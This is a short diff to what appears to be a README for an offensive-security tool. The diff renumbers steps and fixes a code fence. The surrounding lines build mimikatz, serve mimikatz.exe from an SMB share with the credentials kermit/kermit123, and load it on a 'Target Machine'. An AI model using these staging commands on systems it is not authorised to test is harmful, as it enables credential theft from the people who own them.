@@ -24,13 +24,13 @@ toolpy -t mimikatz -a x64
 
 
 2. Run a server
-3. ```bash
+```bash
 servpy smb -u kermit -pw kermit123 -f mimikatz.exe
 ```
 ![servpy](https://github.com/user-attachments/assets/833c27d0-c865-4cfc-8c23-9fb611bbb768)
 
 
-4. Load the script on Target Machine
+3. Load the script on Target Machine
 
 For Linux
 ```bash
